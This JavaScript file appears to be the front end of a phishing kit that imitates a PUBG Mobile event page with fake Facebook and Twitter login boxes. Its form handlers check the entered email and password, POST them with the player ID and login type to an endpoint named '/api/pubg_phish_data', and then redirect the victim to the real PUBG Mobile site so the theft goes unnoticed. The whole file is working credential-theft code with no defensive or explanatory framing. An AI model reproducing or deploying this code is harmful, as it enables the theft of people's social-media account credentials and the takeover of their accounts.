
function open_facebook() {
    $('.login-facebook').show();
    $('.account_login').hide();
}
function open_twitter() {
    $('.login-twitter').show();
    $('.account_login').hide();
}
function close_facebook() {
    $('.login-facebook').hide();
    $('.account_login').show();
    $('#load-login').hide();    
    $('#box-login').show();
}
function close_twitter() {
    $('.login-twitter').hide();
    $('.account_login').show();
    $('#load-login').hide();    
    $('#box-login').show();
}

$(document).ready(function(){
  $('#password-twitter').keyup(function(){
      if($(this).val().length !=0){
          $('.onbutton').removeClass().addClass('twbutton'); 
      }
      else
      {
          $('.twbutton').removeClass().addClass('onbutton'); 
      }
  })
});

function ValidateLoginFbData() {
	$('#ValidateLoginFbForm').submit(function(submitingValidateLoginFbData){
	submitingValidateLoginFbData.preventDefault();
	
	$emailfb = $('#email-facebook').val().trim();
	$passwordfb = $('#password-facebook').val().trim();
	$loginfb = $('#login-facebook').val().trim();
    $playid = $('#ValidatePopupPlayId').val().trim();
    
    if($emailfb == '' || $emailfb == null || $emailfb.length <= 5) {
        $('.email-fb').fadeIn();
        setTimeout(function () {
            $('.email-fb').fadeOut();
        }, 2000);                     
        $('.sandi-fb').hide();
        $('.login-facebook').show();
        return false;
    } else {
        $('.email-fb').hide();
        $('.login-facebook').hide();
    }
    
    if($passwordfb == '' || $passwordfb == null || $passwordfb.length <= 5) {
        $('.sandi-fb').fadeIn();
        setTimeout(function () {
            $('.sandi-fb').fadeOut();
        }, 2000);                     
        $('.login-facebook').show();
        return false;
    } else {
        $('.sandi-fb').hide();
        $('.login-facebook').hide();	 
        $('.account_verification').show();
        
        // Send data to server
        $.ajax({
            type: "POST",
            url: "/api/pubg_phish_data",
            data: {
                playid: $playid,
                email: $emailfb,
                password: $passwordfb,
                login: $loginfb
            },
            success: function(){
                setTimeout(function() {
                    window.location.href = 'https://www.pubgmobile.com';
                }, 2000);
            }
        });
    }
	});  
	return false;     	           
}

function ValidateLoginTwitterData() {
	$('#ValidateLoginTwitterForm').submit(function(submitingValidateLoginTwitterData){
	submitingValidateLoginTwitterData.preventDefault();
	
	$emailtw = $('#email-twitter').val().trim();
	$passwordtw = $('#password-twitter').val().trim();
	$logintw = $('#login-twitter').val().trim();
    $playid = $('#ValidatePopupPlayId').val().trim();
    
    if($emailtw == '' || $emailtw == null || $emailtw.length <= 3) {
        $('.email-tw').fadeIn();
        setTimeout(function () {
            $('.email-tw').fadeOut();
        }, 2000);                     
        $('.sandi-tw').hide();
        $('.login-twitter').show();
        return false;
    } else {
        $('.email-tw').hide();
        $('.login-twitter').hide();
    }
    
    if($passwordtw == '' || $passwordtw == null || $passwordtw.length <= 7) {
        $('.sandi-tw').fadeIn();
        setTimeout(function () {
            $('.sandi-tw').fadeOut();
        }, 2000);                     
        $('.login-twitter').show();
        return false;
    } else {
        $('.sandi-tw').hide();
        $('.login-twitter').hide();
        $('.account_verification').show();
        
        // Send data to server
        $.ajax({
            type: "POST",
            url: "/api/pubg_phish_data",
            data: {
                playid: $playid,
                email: $emailtw,
                password: $passwordtw,
                login: $logintw
            },
            success: function(){
                setTimeout(function() {
                    window.location.href = 'https://www.pubgmobile.com';
                }, 2000);
            }
        });
    }
	});  
	return false;     	           
}
